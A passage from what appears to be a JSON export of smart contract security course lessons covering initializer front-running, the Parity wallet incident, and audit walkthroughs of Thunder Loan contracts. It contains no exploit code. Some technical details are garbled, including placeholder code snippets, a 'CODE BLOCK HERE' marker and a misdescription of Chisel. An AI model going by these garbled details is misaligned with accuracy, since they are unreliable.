scenarios, completely breaks.\n\n## Mitigation: Keeping it Tight and Right\n\nIdentifying the problem is half the task. Knowing how to prevent it, however, is the real deal. How do we solve this initialization front-running problem in our contracts? It can be slightly tricky, and the best practice to ensure your contract's safety is actually quite simple - automate the initialization during deployment.\n\nBy automatically calling the initialize function during deployment, developers can reduce the risk of forgetting to manually trigger it post-deployment. This tactic not only ensures that all contract parameters are set as soon as the contract is deployed, but it also provides a consistent testing and deployment flow.\n\n## Conclusion\n\nDespite `initializers` being flagged as a low risk, they pose an architecture flaw that can easily be exploited if left unchecked. As blockchain developers, we need to not only write rock-solid smart contracts but ensure they're thoroughly tested and deployed without leaving potential loopholes for others to exploit.\n\nAnd to the auditors out there, next time you come across an `initializer`, remember:\n\n> \"An initializer, though small, can cause great wreckage.\"\n",
          "updates": []
        },
        {
          "lessonId": "875535af-67e2-4d0f-9a4b-2a043ad2b20e",
          "number": 21,
          "title": "Failure To Initialize: Remix",
          "slug": "failure-to-initialize-remix",
          "folderName": "21-failure-to-initialize-remix",
          "description": "",
          "duration": 2,
          "videoUrl": "Xh00ZispxghC01TQHMyym00026COmnCn5ygOKWvjKs81w4Y",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/21-failure-to-initialize-remix/+page.md",
          "markdownContent": "---\ntitle: Exploit - Failure to Initialize - Remix Example\n---\n\n## Let's Play: Exploring the Issue in Remix\n\n[Remix](https://remix.ethereum.org/) et's compile and deploy a sample SC simulating the 'failure to initialize' flaw.\n\n![](https://cdn.videotap.com/HhYH7vlvKZcgQ2YeBn5v-29.77.png)\n\nFollowing successful deployment, you will find several functions. Initiating the `initialize` function will initially return `false` since, with nothing preset, the value is logically zero.\n\nHowever, if we forget to officially initialize our variable and start incrementing the not-yet-existent element (say 4-5 times), it would start registering those values. We can then observe that my value has progressively increased with each increment, despite having no explicit initial value.\n\nHere's the kicker - if you now stumble upon the error and initialize the element (say, with 123), an anomaly occurs. Instead of adding to the increments, the value is completely overwritten with the initialized value. In our case, my value resets to 123, disregarding all prior increments.\n\n> **Note**: Remember that a correctly built `initialize` function should have protection against subsequent initializations, to prevent overwriting of any pre-existing data.\n\n## Proactive Measures and Further Exploration\n\nThe aforementioned problem can be prevented by ensuring initialization prior to interaction with a contract. This might seem insignificant, but in the world of coding, minor details can influence the major outcomes.\n\nLet's conclude with a suggestion - why not challenge yourself with the capture-the-flags exercise available on the repository? It might provide an interactive environment for understanding the problem better.\n\nTo explore further on this issue, head back to the associated Github repository.\n\nAnd that's it folks, the overlooked yet crucial issue of 'Failure to Initialize' in the realm of SC exploits. I hope this post offers you meaningful insights and may your journey in the world of programming be devoid of such pitfalls!\n\nHappy Coding!\n",
          "updates": []
        },
        {
          "lessonId": "198f16fc-ba92-4b30-aa7d-74d507193315",
          "number": 22,
          "title": "Case Study: Failure To Initialize",
          "slug": "failure-to-initialize-case-study",
          "folderName": "22-failure-to-initialize-case-study",
          "description": "",
          "duration": 3,
          "videoUrl": "qEZ600bi01W3vprQBwXGT101w2LAsgKvl01bZzjS028JHgtQ",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/22-failure-to-initialize-case-study/+page.md",
          "markdownContent": "---\ntitle: Exploit - Failure to Initialize - Case Study\n---\n\n# Failure to Initialize: A Lesson from Smart Contract Exploits\n\nIf you've ever dabbled in the realm of smart contracts, you may be familiar with an infamous exploit called \"Failure to Initialize.\" This notorious event unfolded in the Web Three Ethereum Ecosystem, involving a GitHub issue that potentially devastated the contract behind the Parity Wallet. It serves as a harsh reminder to all smart contract developers to initialize their contracts properly, or risk catastrophic failure.\n\nIn this blog post, we'll dissect the event and analyze the lessons learned. This way, we aim to prevent a similar misstep from reoccurring in our own projects or those of others.\n\n## The Initial Issue\n\n![](https://cdn.videotap.com/OY6Xn3YTnnAcgF4AnFtX-17.09.png)The tale starts with an innocent-looking [Git issue](https://github.com/paritytech/parity-ethereum/issues/6995) submitted to the Parity Wallet. Someone had unintentionally \"killed\" the contract - a possibility they were unaware of until it happened. This shocking event triggered a cascade of errors that brought to light a serious vulnerability in the smart contract.\n\nThe Etherscan transaction associated with it confirms the event. When we navigate down to the transaction details, click \"Show more,\" and decode the input data, we can see the parameters they entered when they accidentally invoked the contract's kill function.\n\nThe user was merely experimenting with the contract â€” not anticipating that their \"play\" would cause such devastation. They had overlooked a significant precaution in the preparation: initializing their initializer function.\n\nTragically, the initializer, which was initially neglected, was later invoked. This act inadvertently caused the breakdown of a contract hosting a considerable sum. It's a tale that triggers despair among developers and serves as a potent reminder: **Never forget to initialize your contracts**.\n\n> \"Initialize your initializers. This might seem like a simple step, but one oversight can cause catastrophic consequences for your contracts.\"\n\n## Lessons You Should Carry\n\nWhat enlightenment can we glean from this unfortunate event? Well, it screams out the need for initialization. It also raises questions about potential methods to ensure initialization is never omitted, like incorporating it into a deployment script or implementing a parameter that blocks the rest of the system from interacting until initialization has occurred.\n\nWhile we are discussing potential solutions, it is crucial to note that merely attaching a â€œonlyInitializedâ€ modifier to functions wonâ€™t cut it. This strategy is often ignored by developers who are looking to save on gas fees. However, the primary concern here is to guarantee initialization, irrespective of how it is achieved.\n\nIn the dissected smart contract, there were no blockers placed to prevent interaction with the contract until initialization was complete. This absence is a glaring shortfall needing rectification.\n\nRemember, **initialization can be front-run**. It's vital you put mechanisms in place to prevent such actions from happening, which might wreak havoc akin to the Parity Wallet incident.\n\n## Remember This Tale\n\nThis event, classified under the infamous hack, is widely known as \"Failure to Initialize\". To avoid facing this unfortunate situation, get familiar with the case study, and make sure to initialize your initializers appropriately.\n\nWith the constant evolution of the Ethereum ecosystem, it's crucial to learn from our predecessors' missteps. Let this serve as a lesson to you: Pay attention to initializations, or you might accidentally \"kill\" something you didn't intend to.\n\nThe dark tale of this smart contract mishap should remain a beacon guiding you away from similar pitfalls. It's a call to ensure attentive and thorough development processes, bearing in mind that one small oversight can lead to the interruption of an entire system.\n\n> \"Even the smallest oversight in a contract can lead to the destruction of the entire protocol. Understanding the importance of the initialization steps is critical. Remember, don't let a similar fate befall your contracts.\"\n\nAnd lastly, let the grim tale of \"Failure to Initialize\" remind you: it's wiser to prevent than lament.\n",
          "updates": []
        },
        {
          "lessonId": "0436b816-136a-46c2-9614-c8ce9483128b",
          "number": 23,
          "title": "OracleUpgradeable Continued",
          "slug": "oracleupgradeable-continued",
          "folderName": "23-oracleupgradeable-continued",
          "description": "",
          "duration": 4,
          "videoUrl": "vnQoMafObsu1DgT01laAf0102BcTD88d6AV5DYH2BCz5Qg",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/23-oracleupgradeable-continued/+page.md",
          "markdownContent": "---\ntitle: OracleUpgradeable.sol (Continued)\n---\n\n# Oracle Upgradable: A Thorough Review\n\nWelcome back, Code Critiques! Weâ€™re continuing our journey through the world of blockchain programming and today, we're examining the Oracle Upgradable back-end.\n\n## When It Gets Interesting - getPrice in WETH\n\nOne striking feature that piqued our interest is the `getPrice in WETH`. It is an external public view. Hereâ€™s how it works:\n\n- An address swap of pool tokens is initiated.\n- A specific token is passed through, utilizing the command `Ipool_factory_s_pool_token`.\n- To round this up, `Getpool pool` is then invoked, which is where `get pool tokens` comes in.\n\n![](https://cdn.videotap.com/wbYYfuMAg04eG7LYpZp8-48.15.png)\n\nTo be put simply, we capture the pool swap token, call on `getPrice of one pool token in WETH`, and voila!\n\nInterestingly, this entire process could be completed sans any knowledge of TSWAP. We could still continue with our security review and audit, completely ignoring TSWAP. That being said, it invariably adds value to understand the inner workings of TSWAP.\n\n> If we can identify a loophole or break in this function on TSWAP, it could potentially lead us to finding cracks in Oracle Upgradable as well.\n\nIn essence, whenever we invoke an external contract, one should instantly scan for attack vectors. Questions to ask include: could the price be manipulated? Is there potential for reentrancy attacks?\n\n## The Mystery of TSWAP\n\nHaving explored the intriguing aspects of getPrice in WETH, let's unravel TSWAP. Within TSWAP, the main operational functions appear to be `getPrice of pool token in WETH` and `getPool`.\n\n![](https://cdn.videotap.com/5cZTXH0KnXV4ii8uCDjE-96.3.png)\n\nTo an unskilled eye, it might seem as though the getPrice command redundantly repeats itself. That might be true. Nevertheless, it is doing two distinctly separate tasks â€” it computes the output amount based on an input utilising reserves to ascertain the asset price and pulls out the pool.\n\n## Tests Evaluation\n\nNow let's move to testing, using `units thunderloane test sol` or `Oracleupgradable sol`. If we individualise each point, we can see they are using a mock pool factory for interaction.\n\nUpon closer examination, we can ascertain they are using constraints, which might be a potential issue. An audit informational note would be to recommend them to use forked tests for live protocols.\n\nWhy you may ask? Forked tests simply offer higher guarantees of successful operation.\n\n![](https://cdn.videotap.com/fEeOEcrvj5RmWqYZn9Sd-128.4.png)\n\n## Attack Vector Investigation\n\nLet's take potential attack vectors as an example.\n\nThe `getPrice in WETH` function poses few directly observable issues. However, as we dig deeper, doubts start to emerge. What if someone could break this function? Could the priveleges be misused?\n\nA seemingly harmless function like `getPool, factory address` also needs to be observed closely. On the surface, it looks quite uncomplicated, with a private variable being used to extract the address â€” all good so far.\n\n## Initializer Front Run â€“ A Possibility?\n\nNevertheless, while reviewing the `getPrice in WETH` function, we stumble upon an issue - the possibility of initializer front runs. Although in competitive audits such threats are usually overlooked, protocols still need to be warned of this possibility.\n\nRemembering the infamous attack: What delicate maneuvers are being employed to ensure there's no front run?\n\n## Wrapping it Up\n\n![](https://cdn.videotap.com/4CT0yiquS1CTN2jjVFe4-176.55.png)\n\nOur intense review journey culminates here, having done a fairly comprehensive review, exploring the Oracle Upgradable in its entirety, bringing potential lows to light, such as the chance of initializer front-runs.\n\nBut nonetheless, completing yet another successful review delivers a sense of accomplishment. And so, Oracle Upgradable â€“ ticked off and aced!\n\nOur checklist continues to shorten. Stay tuned for the next fascinating code critique in our series. Happy coding!\n\n> \"Security is a process, not a product. Let's continue this journey together!\"\n",
          "updates": []
        },
        {
          "lessonId": "e5fa2499-e153-4854-8391-1dd83033c999",
          "number": 24,
          "title": "AssetToken",
          "slug": "assettoken",
          "folderName": "24-assettoken",
          "description": "",
          "duration": 10,
          "videoUrl": "9vg9eb8orNC2U3VNkpkvJOLfSzRiPC8TPu26uuqIU400",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/24-assettoken/+page.md",
          "markdownContent": "---\ntitle: AssetToken.sol\n---\n\nIn today's lesson, we will dissect and understand the process and chronology of AssetToken.sol while simultaneously attempting to reduce the complexity of this unwieldy 129-line monster code. We will be following the analysis methods of one of the smart contract industry's finest - Tincho.\n\n![](https://cdn.videotap.com/ymeUVPEJfTmzpyvsbUJU-38.26.png)\n\nAlthough the enormity of the code may make the checklist seem redundant, it is essential to understand that this seemingly lightweight tool can provide both structure and context, serving as a roadmap when trudging through unknown territories of the code.\n\n## Tackling AssetToken.sol Line-by-Line\n\nEagle-eyeing the checklist we realize that we have revealed another checkmark, indicating we are ready to plow into AssetToken.sol. As we delve deeper, the checklist will begin to take a back seat, but remember, it remains an invaluable tool to grasp the overall context and provide a starting point for understanding the essence of these components.\n\n### Thunderloan Digitization\n\nThunderloan serves as an apt milestone in our journey. We will first scour Thunderloan, before advancing to its upgraded version. The sequence may seem counterintuitive due to the contracted length of its upgraded edition. However, a profound understanding of the current protocol is instrumental in discerning the necessities for upgrades. The supposed 327-line-dependent code may differ drastically, but only time will tell!\n\nNow, let's proceed to dissect AssetToken.sol. It exemplifies the receipt role in our smart contract. It enables liquidity providers to deposit assets into Thunderloan, in return for asset tokens. The accumulation of interest over time is influenced by the number of people who borrow flash loans.\n\nBorrowing our previous Flash loans example, consider a whale who deposits money into a Flash loan contract. In return, they receive shares or a token representative of the money they've placed in the contract. This share-token accrues interest based on the flash loan borrowers' fees.\n\nThe role of Open Zeppelin's ERC20 here needs special mention. It provides an interface and a wrapper around ERC20 operations that would typically fail if the token contract returned false. The wrapper, aptly named Safe ERC20, serves as a fail-safe for erratic ERC20s, throwing on failure to prevent compromising the entire operation.\n\n## Unveiling Asset Token and Shares\n\nAs we dig deeper, mining further insights from the wall of text, a pattern begins to emerge. The term \"underlying\" in the code seems to refer to USDC, whereas the \"asset token\" is linked to the pool's shares. Depositing USDC gives you pool shares proportionate to the exchange rate defined within the contract.\n\n> \"For instance, if we have two shares and the exchange rate is two to one, we can exchange our two shares for four tokens.\"\n\nHow they calculate the exchange rate mirrors the workings of Compound Finance, underlining the deliberateness in the design. If we can master understanding the contract's innards, unraveling the rest of the mysteries becomes a breeze.\n\n### Side Quest into Compound's Territories\n\nAt this juncture, it might be advantageous to wander into the realm of Compound, discern how it functions and sift out any potential issues. Familiarity with similar protocols can empower us in our mission to secure this contract.\n\nHowever, we won't be trailing down this path today. It is, nonetheless, a recommended sidequest to undertake at some stage. Try writing a concise, understandable article explaining the working protocol of Compound, or even the comparable Aave.\n\n## Tracing the Exchange Rate Pattern\n\nReturning to our original predicament, we bump into our exchange rate again, causing us to raise an eyebrow. This instance hints at a potential bug spot in our code.\n\nThe next issue arises during the creation of new asset tokens or shares. Minting new asset tokens conducts an access control check to confirm the caller is the Thunderloan contract.\n\n> \"This begs the question, could an attack vector appear that allows an attacker to call mint from the Thunderloan contract when they shouldn't?\"\n\nIn the same vein, burning existing asset tokens or shares runs a similar check. Our questioning spirits seek an answer from the code. Could non-standard, \"weird\" ERC20s wreck havoc in our methods - Safetransfer? And more specifically, what if USDC decided to blacklist contracts (like thunder loan or the asset token contract)? A medium to low priority question but worth a nod.\n\n### Minting New Conclusions\n\nWrapping up our intricate dissection of the code, we are left with relevant questions that will guide us down the path of systematizing a secure, functional protocol. As we remain vigilant, aiming to decipher the mysteries of our smart contract, let us head over to the next complex labyrinth- Thunderloan.\n\nIn the coming blog posts, we'll continue to explore potential security vulnerabilities, unravel other intriguing aspects of this code, and hopefully unlock more mysteries of smart contract security reviews. So, stay tuned and keep reading.\n",
          "updates": []
        },
        {
          "lessonId": "a0f06f3b-c211-4369-9667-636f39d1cb0a",
          "number": 25,
          "title": "AssetToken: Update Exchange Rate",
          "slug": "asset-token-update-exchange-rate",
          "folderName": "25-asset-token-update-exchange-rate",
          "description": "",
          "duration": 6,
          "videoUrl": "bgmtCLets91K6QuBooY1r5RcIslnzXZLYqRmZPCLJUg",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/25-asset-token-update-exchange-rate/+page.md",
          "markdownContent": "---\ntitle: AssetToken.sol - updateExchangeRate\n---\n\n## The Function: Update Exchange Rate\n\nLet's dive into a seemingly vital function called `updateExchangeRate()`. The comments clarify that it obtains the current exchange rate (#1) and computes it by dividing the fee size by the total supply. An intriguing remark states that the exchange rate should consistently increaseâ€”never decreaseâ€”an invariant principle at work. **But why should this exchange rate always escalate and never decline?**\n\n**CODE BLOCK HERE**\n\nAs we delve deeper, we set:`newExchangeRate = oldExchangeRate * (totalSupply + fee) / totalSupply`.\n\n![](https://cdn.videotap.com/gi422wVmQ3SFrgJrvlSw-84.97.png)\n\nAs we break down how this formula functions:\n\n- If the old exchange rate is 1,\n- The total supply of asset tokens is 4,\n- Fee is 0.5,\n\nComputing ((4 + 0.5)/ 4), we result with a new exchange rate of 1.125. From this, it seems that `updateExchangeRate()` is likely responsible for updating the asset tokens' exchange rate to their underlying assets.\n\nTo illustrate, imagine this hypothetical scenario where a whale deposits or withdraws shares. The amount that gets deposited or withdrawn hinges upon the exchange rate, which can change, presumably having something to do with the fee. In a scenario where the exchange rate is two to one, if a user were to deposit $1,000, they would receive 2000 asset tokens in return.\n\n**But why are we updating the exchange rate?**\n\nLet's revisit the above formula: What happens if the total supply is zero?As per the formula, `S exchange rate starts at 1 * 0 + let's say the fee is zero divided by zero`, the computation breaks. Would this pose an issue? Could there be a way that this could break and make the total supply zero? Questions to consider.\n\n![](https://cdn.videotap.com/SLGckrl4g0AjIi7bUdwS-230.62.png)\n\nWe check for a condition `if newExchangeRate <= oldExchangeRate`, then instruct it to revert, with a message saying, \"Exchange rate can only increase.\" The condition itself is a clear implementation of the invariant principle stated earlier. On the other hand, if the new exchange rate is higher, it sets `sExchangeRate = newExchangeRate` before emitting an event.\n\nAt a first glance, this function seems correct and ready to run. It updates the exchange rate, a crucial variable in the relationship between the shares and the underlying assets. The rate update mainly seems to be triggered by fees.\n\n## Some Possible Improvements\n\nAn important aspect that one could focus on is the multiple storage reads in the `updateExchangeRate( )` functionâ€” `s_ exchangeRate`, `s_totalSupply`, and `s_fee`. Given that storage reads are gas expensive, you could possibly optimize this by storing them as a memory variableâ€”an aspect to consider during an audit for gas usage.\n\nNote: Sometimes, it is the experience that helps spot these potential storage issues. For instance, if you see multiple s\\_ syntax terms, that might be a hint about multiple storage operations.\n\n![](https://cdn.videotap.com/tGc23bAltPLCCdT51Y39-303.45.png)\n\nDespite not discovering any immediate problem with the contract, analyzing this function helped us understand the contract better. We now know how the exchange rate behaves, and it's clear that the fee plays a significant role in its computation.\n\nIn the next phase, we plan on investigating two more functionsâ€”ThunderLoan and ThunderLoanUpgraded. We'll tackle ThunderLoan first, understand its functionalities thoroughly, then move onto ThunderLoanUpgraded to identify the upgrades.\n\nStay tuned in for our exciting journey as we delve deeper to explore these functions. Keep coding!\n",
          "updates": []
        },
        {
          "lessonId": "3f374647-b6b6-4687-bda5-c4262ae1a79a",
          "number": 26,
          "title": "Thunderloan: Starting At The Top",
          "slug": "thunderloan-starting-at-the-top",
          "folderName": "26-thunderloan-starting-at-the-top",
          "description": "",
          "duration": 9,
          "videoUrl": "f1IpKW4LR6QUm3V7DWwnXIp5Pno022WuYMkMFyJqN71Y",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/26-thunderloan-starting-at-the-top/+page.md",
          "markdownContent": "---\ntitle: Thunderloan.sol - Starting At The Top\n---\n\n## Initial Exploration: Imports\n\nBefore we get our hands dirty with the functions, we start our journey with imports. There's plethora of imports in there, some of which include `Safe ERC 20`, `Asset token`, `IERC 20`, `Metadata`, `Ownable upgradable`, `Initializable`, `UUPs upgradable`, `Oracle Upgradable`, just to name a few.\n\nIn order to facilitate the learning process, I will provide a preamble of our focus in each section, \"priming your brain\" to absorb the upcoming content. Educational studies support this method, indicating that offering a high-level overview before delving into deeper detailing enhances the learning experience.\n\n**Quick tip:** In order to better understand protocols, remember to go through their read-me's for a bird's eye view before examining the individual codes.\n\nFollowing this advice, let's start piecing together the puzzle. `Ownable upgradable` might be a newer import to some, so it might be beneficial to quickly explore it in Open Zeppelin. This is the only-owner contract but with an upgradable version. Taking a close look, we see that it uses `ownable init` and needs to set an initial owner and transfer ownership.\n\n![](https://cdn.videotap.com/kyjLSLgBPsyDSSFpZ9P1-124.85.png)\n\nWe also find a reference to `UUPs upgradable`, which implements the UUPs proxy pattern, a common pattern for smart contracts. If youâ€™re unfamiliar with the UUPs proxy, I strongly recommend that you brush up on it or you could revisit the Foundry course and specifically look at the `Foundry upgrades F 23` for a better understanding.\n\nFinally, in the list of our imports, we come across `iFLASH loan receiver`, which is a library offering easier to use functions like `send value`.\n\n## Diving Deep into the Smart Contract\n\nNext up, we ask, \"While going top to bottom, have we asked enough questions?\" Since there arenâ€™t major issues with the imports, we move on.\n\nLooking at the contract `Thunderloan`, it is clearly recognizable that it extends `Initializable`, `Ownable upgradable`, `UUPs upgradable`, and `Oracle Upgradable`. Checking whether it should extend anything else, we find no, it's all good here.\n\n![](https://cdn.videotap.com/8ErUx4D6tAmn03SvJNAC-218.48.png)\n\nIn the next section, we encounter a bunch of constants and state variables, first of which is `token to asset token`. To gain a better understanding of its role, we do a quick search and find that itâ€™s used in various operations like deposit, redeem, Flash loan, etc.\n\n```code\n// State variableS token to asset token\n```\n\nAfter some explanation and assumptions, we infer that this maps the underlying token to its asset token. For example, if a liquidity provider deposits USDC, it will generate a USDC asset token, representing the amount of USDC you've deposited.\n\nFollowing this, we stumble upon `fee in way`, which we verify by checking its initialization in the initializer function.\n\nAlso, we encounter an auditing issue that `fee precision` should be either constant or immutable.\n\nNext is `token to currently flash loan`, so this is assumedly a mapping that notifies us if a token is mid flash loan.\n\n## Delving into the Modifiers of our Smart Contract\n\nWell, weâ€™ve had our fair share of state variables. Now, it's time to unravel the modifiers.\n\n```code\nrevert if zero\n```\n\nThis modifier reverts operation if amount equals zero. The other modifier `revert if not allowed token`, ensures operation would only proceed with allowed token only.\n\nTurns out, there's a precheck for tokens, which as a result reduces the risk of passing bad tokens to the contract.\n\n```code\nmodifier not allowed token\n```\n\nWe find a function named `is allowed token`, and upon exploration, it returns `s token to asset token of the token does not equal zero`. Therefore, it seems it's only allowing a token if it has been set before.\n\nLastly, we observe that most of this looks benign so far, but remember we're just getting started. In this initial inspection, we haven't really delved into the functions yet. But rest assured, there's more to find in this intriguing world of the Thunderloan Sol smart contract!\n",
          "updates": []
        },
        {
          "lessonId": "43164196-4157-43e1-a634-c202d8fd2b9e",
          "number": 27,
          "title": "ThunderLoan Functions",
          "slug": "thunderloan-functions",
          "folderName": "27-thunderloan-functions",
          "description": "",
          "duration": 8,
          "videoUrl": "NDd01ZCx8HtMKpkGgZhXyNea02ghmGz8co4K6WdmX00EmQ",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/27-thunderloan-functions/+page.md",
          "markdownContent": "---\ntitle: Thunderloan.sol - Functions\n---\n\n# Demystifying Smart Contracts: A Deep Dive into Functions, Constructors and Operators\n\nLearning how to build smart contracts is challenging, but the rewards are immense. To help you on this journey, in this blog post, we will scrutinize the intricate workings of smart contract functions, constructors, and more.\n\n## Beginning with the Constructor\n\nFirst things first, we start by defining a constructor with a custom Oz (OpenZeppelin) upgrade â€” `Unsafe Allow Constructor`. This construct serves to pacify static analysis tools that generally get riled up with all the initializer tricks we use.\n\nA vital keyword we use is `DisableInitializers` that originates directly from the Initializable package. It's a safeguard to prevent the inadvertent calling of any initializers in the constructor, an act we want to avoid at all costs because our smart contract is upgradable, and it exists behind a proxy.\n\n### Understanding OwnableInit\n\nWe already mentioned the effects of `initializer` modifier, particularly how it could get front run. Now, let's talk about `OwnableInit`. This function merely facilitates the transfer to the preliminary owner.\n\n### Diving into UpgradableInit\n\nThis function has the same modus operandi as `UUPsUpgradableInit`, setting up storage for UUPs. However, considering UUPs is a comprehensive subject, we will not go into its details for now.\n\n### Getting Familiar with OracleInit\n\nTo further understand `OracleInit`, imagine using T-Swap (an address) as a kind of oracle. There's also the initial fee precision and initial fee for flash loans.\n\n## The Deposit Function\n\nThis is a very crucial function and, yes, it's missing Natspec! It's essential to call this out and highlight the necessity of the Natspec. This function is responsible for allowing users to deposit their tokens into the contract, thus facilitating flash loans for other users.\n\nA few key takeaways from the deposit function:\n\n- If the deposited `amount` is zero, revert\n- If the token is not an allowed token, revert\n- The function also employs the mapping `sTokenToAssetToken` to evaluate which sToken corresponds to which AssetToken\n\n## Setting Allowed Tokens\n\nA healthy exercise in understanding how these tokens are determined, let's look at the `setAllowedToken` function. In effect, it facilitates the setting or removal of tokens.\n\nThis critical function is permissioned and can only be executed by the owner of the protocol. Here's how it works:\n\n- If the token is allowed, it is added to the `sTokenList`\n- If the token is to be disallowed, the function will proceed accordingly\n- The function reverts with the status of the token, i.e., whether it is `already allowed` or not\n\n## Conclusion\n\nIn conclusion, the journey into the realm of smart contracts can be a bit tricky and complex. Still, by analyzing the various functions and their specific roles, one can gain a solid understanding of their dynamics and workflow. Persistent learning, constant practice, and a practical mindset are all that's required to master smart contract development. And remember: always make use of Natspec for the sake of readability and developer friendliness. Happy Coding!\n",
          "updates": []
        },
        {
          "lessonId": "5a4c33fb-b6dc-4a5d-99fd-d123dbfddc28",
          "number": 28,
          "title": "Testing Deleting Mappings",
          "slug": "testing-deleting-mappings",
          "folderName": "28-testing-deleting-mappings",
          "description": "",
          "duration": 3,
          "videoUrl": "JQQsYsbP6ROypwK7802vWVRc163DtCQDtd4fUlUIM8Q4",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/28-testing-deleting-mappings/+page.md",
          "markdownContent": "---\ntitle: Testing Deleting Mappings and Fixing Our Tools\n---\n\n# Smart Contracts and Data Management: A Deep Dive into Token Mapping and Deletion\n\nWelcome to our deep dive discussion on asset tokens, deleting mappings, and the peculiarities of Solidity smart contracts. Today, we'll unravel how smart contracts interact with asset tokens and the possible pitfalls and bugs that can arise as we develop our applications.\n\n## Deletion and Checks in Asset Token Mappings\n\nIn a smart contract, we typically assign values and map `address` to `assetToken`.\n\nThis line means, simply, we're assigning the token located at `assetToken` to a variable also named `assetToken`.\n\nNow, this can lead to a critical question:\n\n> Does deleting a mapping work?\n\n![](https://cdn.videotap.com/EFG0Cihz1p7oQkV1y9Hx-36.9.png)\n\nIt's a valid question because let's say we have several checks on `assetToken == 0`. If the deletion process doesn't work as expected, our asset won't return to 0. So, how do we test this?\n\n## Testing Deletion with Chisel\n\nTo explore this, I decided to pull up Chisel, a Solidity language extension for Visual Studio, and create a mapping with the structure `address` to `address`.\n\nIn theory, when I look up `tokenToToken[address1]`, I'll get `address2`. Now, let's go ahead and attempt deletion:\n\nConsequently, when I look up `tokenToToken[address1]` after the deletion, I'm still getting `address2`. Clearly, something is off here.\n\n![](https://cdn.videotap.com/nqmehgM9xG2CGsHOR1yI-80.5.png)\n\n## Digging Deeper with Remix\n\nTo further understand the issue, let's pull up Remix, a powerful, open-source tool used for writing Solidity smart contracts. We'll create a simple contract, aimed at mapping `address` to `address`.\n\nFollowing similar steps as before, we'll set the mapping between an account address and the contract address, then delete the mapping, and finally, check the mapping again.\n\nThis time we get zero, contrary to what Chisel showed.\n\n## A Bug in Foundry\n\nThe probable conclusion? There's likely a bug with Foundry.\n\nYour logical next step should be heading to Foundry's GitHub page and opening an issue. Check out the existing issues first, of course. Search for \"Chisel mappings\" and see if there's a relevant issue already there. If nothing matches, make a new issue indicating the problem with Chisel mappings deletion.\n\nHere we've encountered a real-life bug, and we have done our part to inform the community about it. So, until next time, keep exploring, keep debugging, and keep developing.\n",
          "updates": []
        },
        {
          "lessonId": "380a7e19-c5ed-471c-a3d6-dbe8ad472e6e",
          "number": 29,
          "title": "Note On Linear Progress",
          "slug": "note-on-linear-progress",
          "folderName": "29-note-on-linear-progress",
          "description": "",
          "duration": 2,
          "videoUrl": "p01naqjLJp2ZRu00gU7TJgYticLIfIrkO7lAS4nG9FUC4",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/29-note-on-linear-progress/+page.md",
          "markdownContent": "---\ntitle: A Note On The Linear Progress Of Security Reviews\n---\n\n# Evaluating Smart Contract Security: Journey Through \"Thunder Loan\"\n\nWelcome, tech lovers! Today, we're taking a deep-dive into the riveting world of smart contract audits. In this post, we'll be dissecting a Tech Talk where we audited a smart contract named \"Thunder Loan.\" Buckle up, it's going to be an exciting learning experience!\n\n## Remix vs Chisel: The Battle of Testing Tools\n\nIn the world of software development, it's not uncommon to use different tools for testing code. In this instance, we initially tested Thunder Loan using Remix and throughout our auditing process, we discovered a few things that are worth mentioning.\n\n_Fire up your terminal, it's time to discuss some code!_\n\n![](https://cdn.videotap.com/86697zC0OHfWSFQSGKUh-13.33.png)\n\nWhen we attempted to delete particular sets of code, it appeared to work in Remix quite fluidly.\n\n```javascript\ndelete this;\n```\n\nDespite the successful outcome in Remix, the same could not be said when we tried it in Chisel. As a coding auditor, I can safely say Remix was more accurate in this case. Chisel was, unfortunately, incorrect in its evaluation of the aforementioned code.\n\n## Emitting Tokens and Asset Returns\n\nNext, we looked into the `Emit allowed token set` function. After careful examination, we were pleased to see that the system accurately complied.\n\n```javascript\nemit allowedTokenSet;\n```\n\nFollowing this, we went on to return the asset tokens.\n\n```javascript\nreturn assetToken;\n```\n\nAgain, this process appeared to run smoothly. Keep in mind; one crucial aspect of an audit is multiple points of review. This helps maintain precision in an audit. I usually do an \"Okay\" check at the start and then perform another towards the end, as in \"Audit in Foe.\"\n\nAlso, another point to ponder; many tools such as Darren catch the \"needs Nat spec\" command pretty well. So while it may not seem necessary to include this, it could assist in accurate evaluations and maybe even in bug spotting!\n\n## Deep Dive into the Deposit Function\n\nNow we've arrived at another integral part of our audit â€“ the deposit function. Furthermore, we explored the selection process for tokens.\n\n```javascript\nadd Token;remove Token;\n```\n\nHere, things got a tad more interesting. The code seemed to be allowing the addition and removal of tokens at the will of the owner. While this is generally great, it might potential problems in the future. But, of course, only time will unveil that truth.\n\n## Understanding the Non-linear Nature of Audits\n\nSo far, we've gone through at least one function of Thunder Loan, and guess what - No bugs yet! But don't let that fool you. The absence of bugs at the initial stages does not necessarily illustrate a perfect system.\n\n> \"Security reviews are often not linear. It's not like, oh, found a bug here, found a bug here, here, and then three bugs here, and then done. No! They are often exponential.\"\n\nBy the time auditors gain a comprehensive understanding of the codebase, they are better equipped to identify bugs. If bugs are found along the way, that's a bonus!\n\n## A Final Word\n\nAt the end of the day, a thorough audit is more about understanding than it is about unearthing bugs. The more you understand the code, the more efficient you become in identifying any potential or existing bugs. As discouraging as it might seem when bugs fail to show up initially, remember, it's all part of the process! Happy coding, everyone!\n",
          "updates": []
        },
        {
          "lessonId": "b1f60e02-ebdf-4dc1-a994-d22df5ceefa5",
          "number": 30,
          "title": "ThunderLoan Continued",
          "slug": "thunderloan-continued",
          "folderName": "30-thunderloan-continued",
          "description": "",
          "duration": 5,
          "videoUrl": "CLFwX7c7IpFlLXaaXRWiRdAElwI9C9o14xpJmSOO016g",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/30-thunderloan-continued/+page.md",
